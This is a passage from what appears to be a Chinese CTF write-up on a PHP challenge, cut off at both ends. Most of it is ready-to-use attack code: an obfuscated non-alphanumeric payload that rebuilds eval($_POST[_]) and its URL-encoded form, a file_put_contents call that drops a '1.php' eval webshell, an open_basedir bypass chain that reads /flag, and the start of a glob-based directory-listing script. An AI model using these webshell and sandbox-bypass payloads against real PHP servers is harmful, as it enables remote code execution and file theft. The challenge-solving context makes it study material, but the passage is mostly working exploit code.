punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span>++<span class=\"token punctuation\">;</span><span class=\"token variable\">$____</span>.=<span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$_</span>=$<span class=\"token variable\">$____</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$___</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_</span>[_]<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>相当于传入</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token constant\">_</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>注意这里由于有特殊字符的存在得进行一次 url 编码，</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?wllm=<span class=\"token placeholder selector\">%24_</span><span class=\"token placeholder selector\">%3D</span><span class=\"token placeholder selector\">%5B</span><span class=\"token placeholder selector\">%5D</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24_</span><span class=\"token placeholder selector\">%3D</span><span class=\"token placeholder selector\">%40</span><span class=\"token placeholder selector\">%22</span><span class=\"token placeholder selector\">%24_</span><span class=\"token placeholder selector\">%22</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24_</span><span class=\"token placeholder selector\">%3D</span><span class=\"token placeholder selector\">%24_</span><span class=\"token placeholder selector\">%5B</span><span class=\"token string\">'!'</span><span class=\"token placeholder selector\">%3D</span><span class=\"token placeholder selector\">%3D</span><span class=\"token string\">'%40'</span><span class=\"token placeholder selector\">%5D</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24___</span><span class=\"token placeholder selector\">%3D</span><span class=\"token placeholder selector\">%24_</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%3D</span><span class=\"token placeholder selector\">%24_</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24___</span>.<span class=\"token placeholder selector\">%3D</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24___</span>.<span class=\"token placeholder selector\">%3D</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%3D</span><span class=\"token placeholder selector\">%24_</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24___</span>.<span class=\"token placeholder selector\">%3D</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%3D</span><span class=\"token placeholder selector\">%24_</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24___</span>.<span class=\"token placeholder selector\">%3D</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%3D</span><span class=\"token placeholder selector\">%24_</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24___</span>.<span class=\"token placeholder selector\">%3D</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24____</span><span class=\"token placeholder selector\">%3D</span><span class=\"token string\">'_'</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%3D</span><span class=\"token placeholder selector\">%24_</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24____</span>.<span class=\"token placeholder selector\">%3D</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%3D</span><span class=\"token placeholder selector\">%24_</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24____</span>.<span class=\"token placeholder selector\">%3D</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%3D</span><span class=\"token placeholder selector\">%24_</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24____</span>.<span class=\"token placeholder selector\">%3D</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%3D</span><span class=\"token placeholder selector\">%24_</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%2B</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24____</span>.<span class=\"token placeholder selector\">%3D</span><span class=\"token placeholder selector\">%24__</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24_</span><span class=\"token placeholder selector\">%3D</span><span class=\"token placeholder selector\">%24</span><span class=\"token placeholder selector\">%24____</span><span class=\"token placeholder selector\">%3B</span><span class=\"token placeholder selector\">%24___</span><span class=\"token punctuation\">(</span><span class=\"token placeholder selector\">%24_</span><span class=\"token placeholder selector\">%5B_</span><span class=\"token placeholder selector\">%5D</span><span class=\"token punctuation\">)</span><span class=\"token placeholder selector\">%3B</span></pre></td></tr></table></figure><p>尝试执行发现大部分命令执行指令都过滤了，同时设置了 open_basedir，无法看到文件，甚至还用 disabled_function 禁用了很多函数（system,exec 等)，但可以用 file_put_contents 函数绕过</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>_=file_put_<span class=\"token function\">contents</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1.php'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'&lt;?php eval($_POST['</span>aa<span class=\"token string\">']);?>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>或者：</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>_=file_put_<span class=\"token function\">contents</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1.php'</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"&lt;?php print_r(ini_get('open_basedir').'&lt;br>'); mkdir('test'); chdir('test'); ini_set('open_basedir','..'); chdir('..'); chdir('..'); chdir('..'); ini_set('open_basedir','/'); echo file_get_contents('/flag'); print(1);?> \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>关于绕过 open_basedir，可以参考这两篇文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEhQL3BocC1ieXBhc3Mtb3Blbi1iYXNlZGlyLWxpc3QtZGlyZWN0b3J5Lmh0bWw=\">PHP 绕过 open_basedir 列目录的研究</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOS9hcnRpY2xlL2RldGFpbHMvMTIzNjgzMDI1\">php 绕过 open_basedir</span></p>\n<p>留几个 open_basedir 绕过脚本</p>\n<p>获取目录</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">ini_get</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'open_basedir'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;br>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token variable\">$dir_array</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$dir</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">DirectoryIterator</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'glob:///*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dir</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$d</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span 